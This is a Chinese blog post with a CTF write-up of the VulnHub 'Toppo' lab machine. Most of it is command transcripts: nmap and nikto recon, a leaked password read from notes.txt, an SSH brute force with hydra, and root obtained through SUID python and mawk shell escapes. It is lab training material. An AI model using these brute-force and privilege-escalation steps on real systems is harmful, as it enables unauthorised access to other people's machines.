<!doctype html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
    <!--Setting-->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="renderer" content="webkit|ie-comp|ie-stand">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="format-detection" content="telephone=no,email=no">
    
    
    <!--Simple SEO-->

<meta name="description" content="人不折腾枉少年/">


<meta name="robots" content="all">
<meta name="google" content="all">
<meta name="googlebot" content="all">
<meta name="verify" content="all">
    <!--Title-->

<title>Write-up-Toppo | Kali-Team</title>

<link rel="alternate" href="/atom.xml" title="Kali-Team" type="application/atom+xml">


<link rel="icon" href="/favicon.ico">

    
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="/css/pages/post.css">
<link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="/css/thirdParty/highlight/github.css">
<link rel="stylesheet" href="/.css">

    
    
    
</head>
</html>
<body id="normal">
<!--[if lte IE 8]>
<style>
    html{ font-size: 1em }
</style>
<![endif]-->
<!--[if lte IE 9]>
<style>
    header{ top: 71px; position: absolute!important;}
    #container{padding-top: 151px!important;}
</style>
<div style="position:fixed;z-index:9999;left:0;top:0;width:100%;height:70px;background-color:#e0e0e0;color:#396CA5;border-bottom:1px solid #cecece;text-align:center;line-height:70px;white-space: nowrap;overflow: hidden;text-overflow: ellipsis">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
<![endif]-->

<div id="wrap">
    <header style="position: absolute;">
    <div id="site-meta">
        <a href="/" id="logo">
            <h1 class="title">Kali-Team</h1>
        </a>
        
        <h2 class="subtitle">三米前有蕉皮</h2>
        
    </div>
    <ul id="nav">
        
            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
        
            <li><a href="/archives"><i class="fa fa-archive widget-title"></i>归档</a></li>
        
            <li><a href="/atom.xml"><i class="fa fa-rss"></i>RSS</a></li>
        
        <li id="search"><a href="javascript:void(0)"><i class="fa fa-search"></i>搜索</a></li>
    </ul>
</header>

    <div id="container">
        
<ul id="sidebar">
    
    
<li class="widget notification">
    <i class="fa fa-bell-o"></i>
    <div>
        <br>
- 人不折腾枉少年<br>
- ID：三米前有蕉皮<br>
- Team : Cora Laboratory / Kali-Team<br>
- Tox：<img src="/img/Kali-Team.png" alt="Smiley face" width="42" height="42"><br>
    </div>
</li>

    
    
<li class="widget widget-normal category">
    <h3 class="fa fa-th widget-title">分类</h3>
    <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Arch/"><i class="fa" aria-hidden="true">Arch</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/"><i class="fa" aria-hidden="true">CTF</i></a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web/"><i class="fa" aria-hidden="true">Web</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/"><i class="fa" aria-hidden="true">工具</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞复现/"><i class="fa" aria-hidden="true">漏洞复现</i></a><span class="category-list-count">1</span></li></ul>
</li>


    
    
<li class="widget widget-normal archive">
  <h3 class="fa fa-archive widget-title">归档</h3>
    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/"><i class="fa" aria-hidden="true">二月 2019</i></a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/"><i class="fa" aria-hidden="true">十月 2018</i></a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/"><i class="fa" aria-hidden="true">九月 2018</i></a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/"><i class="fa" aria-hidden="true">八月 2018</i></a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/"><i class="fa" aria-hidden="true">七月 2018</i></a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/"><i class="fa" aria-hidden="true">六月 2018</i></a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/"><i class="fa" aria-hidden="true">五月 2018</i></a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/"><i class="fa" aria-hidden="true">四月 2018</i></a><span class="archive-list-count">2</span></li></ul>
</li>


    
    
    
    
<li class="widget widget-normal tags">
  <h3 class="fa fa-tags widget-title">标签云</h3>
  <div class="tagcloud-content">
    
      <a href="/tags/Arch/" style="font-size: 0.14rem; color: #69c">Arch</a> <a href="/tags/Genymotion/" style="font-size: 0.14rem; color: #69c">Genymotion</a> <a href="/tags/CTF/" style="font-size: 0.2rem; color: #0a407c">CTF</a> <a href="/tags/漏洞复现/" style="font-size: 0.14rem; color: #69c">漏洞复现</a> <a href="/tags/XSS/" style="font-size: 0.14rem; color: #69c">XSS</a> <a href="/tags/web/" style="font-size: 0.14rem; color: #69c">web</a> <a href="/tags/Linux/" style="font-size: 0.14rem; color: #69c">Linux</a> <a href="/tags/nmap/" style="font-size: 0.14rem; color: #69c">nmap</a> <a href="/tags/metasploit/" style="font-size: 0.14rem; color: #69c">metasploit</a>
  </div>
</li>


    
    
<li class="widget widget-normal friends-link">
    <h3 class="fa fa-globe widget-title">友链</h3><br>

    
        <a href="http://gh0st.cn/" class="fa" target="_blank">VulKey</a>

    
        <a href="https://10miaomiao.cn/" class="fa" target="_blank">飞跃</a>

    
        <a href="http://www.zmnihao.cn" class="fa" target="_blank">梓铭</a>

    

</li>

    
</ul>


        <div id="main">
    <article id="post">
        <div id="post-header">

            <h1 id="Write-up-Toppo">
                
                Write-up-Toppo
                
            </h1>
            <div class="article-meta">
    
    
    <span class="categories-meta fa-wrap">
            <i class="fa fa-folder-open-o"></i>
        <span>CTF</span>
    </span>
    
    
    <span class="fa-wrap">
         <i class="fa fa-tags"></i>
        <span class="tags-meta">
            
            CTF
            
        </span>
    </span>
    
    
    <span class="fa-wrap">
        <i class="fa fa-clock-o"></i>
        <span class="date-meta ">2018/10/30</span>
    </span>
    
    
    
</div>

            
            
        </div>
        
        <div id="post-body">
            <h3 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h3><ul>
<li><p>下载地址：<a href="https://download.vulnhub.com/toppo/Toppo.zip" target="_blank" rel="noopener">点我</a></p>
</li>
<li><p>哔哩哔哩：<a href="https://www.bilibili.com/video/av35092800/" target="_blank" rel="noopener">哔哩哔哩</a></p>
</li>
</ul>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul>
<li>vmnet8网卡，IP：192.168.131.144，开放web，ssh服务</li>
</ul>
<a id="more"></a>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ip a show dev vmnet8 </span><br><span class="line">5: vmnet8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000</span><br><span class="line">    link/ether 00:50:56:c0:00:08 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.131.1/24 brd 192.168.131.255 scope global vmnet8</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::250:56ff:fec0:8/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">➜  ~ nmap -sn 192.168.131.1/24</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-30 19:46 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.131.1</span><br><span class="line">Host is up (0.00055s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.131.144</span><br><span class="line">Host is up (0.00093s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 3.08 seconds</span><br><span class="line">➜  ~ nmap -T4 -A 192.168.131.144</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-30 20:01 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.131.144</span><br><span class="line">Host is up (0.43s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc (DSA)</span><br><span class="line">|   2048 89:99:c4:54:9a:18:66:f7:<span class="built_in">cd</span>:8e:ab:b6:aa:31:2e:c6 (RSA)</span><br><span class="line">|   256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d (ECDSA)</span><br><span class="line">|_  256 39:d9:79:26:60:3d:6c:a2:1e:8b:19:71:c0:e2:5e:5f (ED25519)</span><br><span class="line">80/tcp  open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title: Clean Blog - Start Bootstrap Theme</span><br><span class="line">111/tcp open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp  rpcbind</span><br><span class="line">|   100024  1          41760/udp  status</span><br><span class="line">|_  100024  1          44661/tcp  status</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 9.36 seconds</span><br></pre></td></tr></table></figure>
<ul>
<li>nikto发现了admin目录还有一个mail目录。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nikto -h http://192.168.131.144/</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.131.144</span><br><span class="line">+ Target Hostname:    192.168.131.144</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2018-10-30 20:04:51 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.4.10 (Debian)</span><br><span class="line">+ Server leaks inodes via ETags, header found with file /, fields: 0x1925 0x563f5cf714e80 </span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not <span class="built_in">set</span>. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span></span><br><span class="line">+ No CGI Directories found (use <span class="string">'-C all'</span> to force check all possible <span class="built_in">dirs</span>)</span><br><span class="line">+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS </span><br><span class="line">+ OSVDB-3268: /admin/: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: /admin/: This might be interesting...</span><br><span class="line">+ OSVDB-3268: /img/: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: /img/: This might be interesting...</span><br><span class="line">+ OSVDB-3268: /mail/: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: /mail/: This might be interesting...</span><br><span class="line">+ OSVDB-3092: /manual/: Web server manual found.</span><br><span class="line">+ OSVDB-3268: /manual/images/: Directory indexing found.</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ 7535 requests: 0 error(s) and 15 item(s) reported on remote host</span><br><span class="line">+ End Time:           2018-10-30 20:05:10 (GMT8) (19 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>
<ul>
<li>admin目录里有一个notes.txt文件，这是他以前的密码:/ 12345ted123。而且提到了技术，钓鱼和足球。社工有用。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl http://192.168.131.144/admin/notes.txt</span><br><span class="line">Note to myself :</span><br><span class="line"></span><br><span class="line">I need to change my password :/ 12345ted123 is too outdated but the technology isn<span class="string">'t my thing i prefer go fishing or watching soccer .</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">➜  ~</span></span><br></pre></td></tr></table></figure>
<h3 id="爆破ssh"><a href="#爆破ssh" class="headerlink" title="爆破ssh"></a>爆破ssh</h3><ul>
<li>生成字典爆破ssh，用户名ted，别问我怎么知道的全网都是猜出来的，只能说出题人没给太多的提示，直觉。</li>
<li>hydra爆破得到密码为12345ted123</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">➜  pydictor git:(master) ✗ python pydictor.py -plug scratch http://192.168.131.144/admin/notes.txt</span><br><span class="line">                              _ _      _</span><br><span class="line">              _ __  _   _  __| (_) ___| |_ ___  _ __</span><br><span class="line">             | <span class="string">'_ \| | | |/ _` | |/ __| __/ _ \| '</span>__|</span><br><span class="line">             | |_) | |_| | (_| | | (__| || (_) | |</span><br><span class="line">             | .__/ \__, |\__,_|_|\___|\__\___/|_|</span><br><span class="line">             |_|    |___/                            2.1.1<span class="comment">#dev</span></span><br><span class="line"></span><br><span class="line">[+] A total of :11 lines</span><br><span class="line">[+] Store <span class="keyword">in</span>   :/home/kali-team/Kali-Team/password-recovery/pydictor/results/scratch_214601.txt </span><br><span class="line">[+] Cost       :0.0451 seconds</span><br><span class="line">➜  pydictor git:(master) ✗ cat results/scratch_214601.txt </span><br><span class="line">myself</span><br><span class="line">password</span><br><span class="line">12345ted123</span><br><span class="line">outdated</span><br><span class="line">technology</span><br><span class="line">thing</span><br><span class="line">prefer</span><br><span class="line">fishing</span><br><span class="line">watching</span><br><span class="line">soccer</span><br><span class="line">admin</span><br><span class="line"></span><br><span class="line">➜  ~ hydra -l ted -P Kali-Team/password-recovery/pydictor/results/scratch_215638.txt ssh://192.168.131.144</span><br><span class="line">Hydra v8.6 (c) 2017 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (http://www.thc.org/thc-hydra) starting at 2018-10-30 21:57:18</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 11 tasks per 1 server, overall 11 tasks, 11 login tries (l:1/p:11), ~1 try per task</span><br><span class="line">[DATA] attacking ssh://192.168.131.144:22/</span><br><span class="line">[22][ssh] host: 192.168.131.144   login: ted   password: 12345ted123</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (http://www.thc.org/thc-hydra) finished at 2018-10-30 21:57:21</span><br></pre></td></tr></table></figure>
<h3 id="提权GetFlag"><a href="#提权GetFlag" class="headerlink" title="提权GetFlag"></a>提权GetFlag</h3><ul>
<li>找开启了SUID权限的应用</li>
</ul>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ted@<span class="symbol">Toppo:</span>~$ id</span><br><span class="line">uid=<span class="number">1000</span>(ted) gid=<span class="number">1000</span>(ted) groups=<span class="number">1000</span>(ted),<span class="number">24</span>(cdrom),<span class="number">25</span>(floppy),<span class="number">29</span>(audio),<span class="number">30</span>(dip),<span class="number">44</span>(video),<span class="number">46</span>(plugdev),<span class="number">108</span>(netdev),<span class="number">114</span>(bluetooth)</span><br><span class="line">ted@<span class="symbol">Toppo:</span>~$ find / -perm -u=s -<span class="keyword">type</span> f <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line">/sbin/mount.nfs</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">eject</span>/<span class="title">dmcrypt</span>-<span class="title">get</span>-<span class="title">device</span></span></span><br><span class="line">/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">dbus</span>-1.0/<span class="title">dbus</span>-<span class="title">daemon</span>-<span class="title">launch</span>-<span class="title">helper</span></span></span><br><span class="line">/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">openssh</span>/<span class="title">ssh</span>-<span class="title">keysign</span></span></span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/python2.<span class="number">7</span></span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/mawk</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br></pre></td></tr></table></figure>
<ul>
<li>找不用root密码就可以用sudo的应用，发现mawk，和Python2.7都不用。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ted@Toppo:~$ cat /etc/sudoers </span><br><span class="line">ted ALL=(ALL) NOPASSWD: /usr/bin/awk</span><br><span class="line"></span><br><span class="line">ted@Toppo:~$</span><br></pre></td></tr></table></figure>
<ul>
<li><ol>
<li>py,</li>
<li>mawk</li>
</ol>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ted@Toppo:/bin$ python -c <span class="string">'import pty;pty.spawn("/bin/sh")'</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)</span><br><span class="line"></span><br><span class="line">ted@Toppo:/bin$ id</span><br><span class="line">uid=1000(ted) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)</span><br><span class="line">ted@Toppo:/bin$ mawk <span class="string">'BEGIN &#123;system("/bin/sh")&#125;'</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat /root/flag.txt</span></span><br><span class="line">_________                                  </span><br><span class="line">|  _   _  |                                 </span><br><span class="line">|_/ | | \_|.--.   _ .--.   _ .--.    .--.   </span><br><span class="line">    | |  / .<span class="string">'`\ \[ '</span>/<span class="string">'`\ \[ '</span>/<span class="string">'`\ \/ .'</span>`\ \ </span><br><span class="line">   _| |_ | \__. | | \__/ | | \__/ || \__. | </span><br><span class="line">  |_____| <span class="string">'.__.'</span>  | ;.__/  | ;.__/  <span class="string">'.__.'</span>  </span><br><span class="line">                 [__|     [__|              </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations ! there is your flag : 0wnedlab&#123;p4ssi0n_c0me_with_pract1ce&#125;</span><br></pre></td></tr></table></figure>
<h3 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h3><ul>
<li>在测试过程中我发现，Python有root权限，执行bash和执行dash返回的权限不一样，bash返回的是普通权限，而dash返回的是root权限。发了三次朋友圈求助终于明白了。其实bash加参数-p使用Posix模式也可以获取root权限。这里接触到了一个新的知识是POSIX 1003.2规范的标准，有兴趣的可以去搜索一下。我就不在这扯了。估计能写几页。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ted@Toppo:~$ python -c <span class="string">'import os;os.system("/bin/bash -p")'</span></span><br><span class="line">bash-4.3<span class="comment"># id</span></span><br><span class="line">uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)</span><br><span class="line">bash-4.3<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">ted@Toppo:~$ python -c <span class="string">'import os;os.system("/bin/bash")'</span></span><br><span class="line">bash-4.3$ id</span><br><span class="line">uid=1000(ted) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)</span><br><span class="line">bash-4.3$ <span class="built_in">exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">ted@Toppo:~$ python -c <span class="string">'import os;os.system("/bin/dash")'</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)</span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line"></span><br><span class="line">root      1926  0.0  1.0  10988  5420 ?        Ss   11:05   0:00  \_ sshd: ted [priv]    </span><br><span class="line">ted       1928  0.0  0.7  10988  4088 ?        S    11:05   0:00      \_ sshd: ted@pts/0     </span><br><span class="line">ted       1929  0.0  0.8   6376  4288 pts/0    Ss   11:05   0:00          \_ -bash</span><br><span class="line">root      2011  0.0  1.1   9816  6120 pts/0    S+   11:13   0:00              \_ python -c import pty;pty.spawn(<span class="string">"/bin/bash"</span>)</span><br><span class="line">ted       2012  0.0  0.6   5448  3528 pts/1    Ss   11:13   0:00                  \_ /bin/bash</span><br><span class="line">ted       2013  0.0  0.4   4768  2548 pts/1    R+   11:13   0:00                      \_ ps aux f</span><br><span class="line">root      1926  0.0  1.0  10988  5420 ?        Ss   11:05   0:00  \_ sshd: ted [priv]    </span><br><span class="line">ted       1928  0.0  0.7  10988  4084 ?        S    11:05   0:00      \_ sshd: ted@pts/0     </span><br><span class="line">ted       1929  0.0  0.8   6376  4288 pts/0    Ss   11:05   0:00          \_ -bash</span><br><span class="line">root      1998  0.0  1.1   9816  6012 pts/0    S+   11:11   0:00              \_ python -c import pty;pty.spawn(<span class="string">"/bin/dash"</span>)</span><br><span class="line">root      1999  0.0  0.2   2272  1380 pts/1    Ss   11:11   0:00                  \_ /bin/dash</span><br><span class="line">root      2001  0.0  0.4   4768  2416 pts/1    R+   11:12   0:00                      \_ ps aux f</span><br></pre></td></tr></table></figure>

        </div>
        <div id="post-footer">
            <div class="avatar">
                <img src="https://avatars3.githubusercontent.com/oa/914415?s=140&u=76e1c6077ea8736045d77e2a059a37e7648f4130&v=4" alt="avatar">
                
                
                <a href="javascript:void(0)" class="donate fa">赠我一杯咖啡</a>
                
            </div>
            <ul class="author-profile-section">
                <li>
                  
                  作者:
                  
                    
                    <a href="/about">Kali-Team</a>
                </li>
                
                <li>发表日期: <span>2018-10-30  19:44:14</span></li>
                
                <li>最后编辑日期: <span>2019-02-14  08:40:21</span></li>
                
                <li class="post-category">
                    文章分类:
                    
                    <a href="/categories/CTF/">CTF</a>
                    
                </li>
                <li class="post-tags">
                    文章标签:
                    
                    <a href="/tags/CTF/">CTF</a>
                    
                </li>
                
                <li> 版权声明: <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">
知识共享署名-非商业性使用-禁止演绎 4.0 未本地化版本许可协议（CC BY-NC-ND 4.0）
</a></li>
                
            </ul>
            <div id="donate-wrap">
                
                
                
                <img src="https://kali-team.cn/img/wechat.jpg" alt="微信付款" class="donate-img">
                
                
            </div>
        </div>
    </article>
    <div class="article-nav">
        
        <a href="/2019/02/14/Genymotion设置代理至BurpSuite和Charles/" class="pre-post fa fa-caret-left">Genymotion设置代理至BurpSuite和Charles</a>
        
        
        <a href="/2018/10/26/Write-up-CH4INRULZ-v1-0-1/" class="next-post fa">Write-up-CH4INRULZ_v1.0.1</a>
        
    </div>
    
    <div id="comments">
        




    </div>
    
</div>


    </div>
    <footer id="footer">
    
    <div class="social">
        
        <a href="https://github.com/cn-kali-team" class="fa fa-github" target="_blank" title="GitHub"></a>
        
        <a href="mailto:root@kali-team.cn" class="fa fa-envelope-square" target="_blank" title="Email"></a>
        
    </div>
    
    <div>
        
        <a href="/" class="copyright-links">Kali-Team</a>&copy;2017 - 2019.All Rights
        Reserved.
    </div>
    <p>Powered by <a href="https://hexo.io" class="copyright-links" target="_blank">Hexo</a> | Theme by <a href="https://github.com/GeekaholicLin" class="copyright-links" target="_blank">GeekaholicLin</a>
    </p>
    
</footer>

</div>
    <ul id="tools">
    <li class="totop-btn fa fa-angle-up"></li>
    <li class="exchange-btn fa fa-exchange"></li>
  
    <li class="toc-btn fa fa-list-ul"></li>
    
    

    
</ul>
<p id="process"></p>
<div id="search-overlay">
    <div class="search-area-wrap">
        <div id="search-area">
            <div class="input-wrap focus">
                <i class="fa fa-search" aria-hidden="true"></i>
                <input id="search-input" autofocus autocomplete="off" type="text" placeholder="search this website...">
            </div>
            <ul id="search-result">
                <li class="load-first"><i class="fa fa-spinner fa-pulse"></i></li>
            </ul>
